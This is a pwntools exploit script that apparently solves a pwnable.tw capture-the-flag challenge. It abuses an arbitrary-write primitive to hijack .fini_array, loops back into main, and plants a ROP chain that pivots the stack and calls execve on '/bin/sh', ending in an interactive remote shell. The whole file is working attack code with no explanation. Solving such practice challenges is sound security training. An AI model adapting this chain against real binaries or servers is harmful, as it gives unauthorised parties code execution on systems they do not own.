from pwn import *                                                                                                                                   
io = remote('chall.pwnable.tw', 10105)

def overwrite(addr, data):
    io.recvuntil('addr:')
    io.send(str(addr))
    io.recvuntil('data:')
    io.send(data)

# hijack .fini_array
fini_array = 0x4b40f0
libc_csu_fini = 0x402960
main = 0x401b6d
overwrite(fini_array, p64(libc_csu_fini) + p64(main))

# rop gadget
leave_ret_addr = 0x401c4b
pop_rdi = 0x401696
pop_rsi = 0x406c30
pop_rdx = 0x446e35
xor_rax_rax = 0x442110
add_al_0x3a = 0x417b0f
add_eax_1 = 0x471811
syscall = 0x4022b4

overwrite(fini_array + 0x10, p64(fini_array + 0x58) + p64(pop_rsi) + p64(0))
overwrite(fini_array + 0x28, p64(pop_rdx) + p64(0) + p64(xor_rax_rax))
overwrite(fini_array + 0x40, p64(add_al_0x3a) + p64(add_eax_1) + p64(syscall))
overwrite(fini_array + 0x58, b'/bin/sh\0')
overwrite(fini_array, p64(leave_ret_addr) + p64(pop_rdi))

io.interactive()
